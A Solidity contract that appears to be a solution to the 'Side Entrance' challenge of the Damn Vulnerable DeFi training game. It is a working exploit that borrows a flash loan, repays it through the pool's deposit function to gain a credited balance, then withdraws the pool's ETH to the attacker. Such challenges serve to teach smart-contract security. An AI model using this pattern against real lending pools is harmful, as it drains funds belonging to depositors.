// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";


/**
 * @title AttackerSide
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackerSide {
    using Address for address payable;
    using SafeMath for uint256;

    address private immutable owner;
    address payable private pool;

    constructor(address payable poolAddress) {
        owner = msg.sender;
        pool = poolAddress;
    }

    modifier onlyAttacker {
        require(msg.sender == owner, "Only owner can use this contract");
        _;
    }

    function exploit(uint256 amount) external onlyAttacker {
        // Execute flashloan, which will call `execute()`
        SideEntranceLenderPool(pool).flashLoan(amount);

        // Withdraw eligible amount
        SideEntranceLenderPool(pool).withdraw();

        // Send back to owner
        payable(msg.sender).sendValue(amount);
    }

    function execute() external payable {
        // Exploit faulty deposit
        SideEntranceLenderPool(pool).deposit{value: msg.value}();
        
        // Now this contract repayed the flashloan, 
        // and additionally registered itself in the pool's balances
        // making us eligible to withdraw
    }

    // Allow deposits of ETH
    receive () external payable {}
}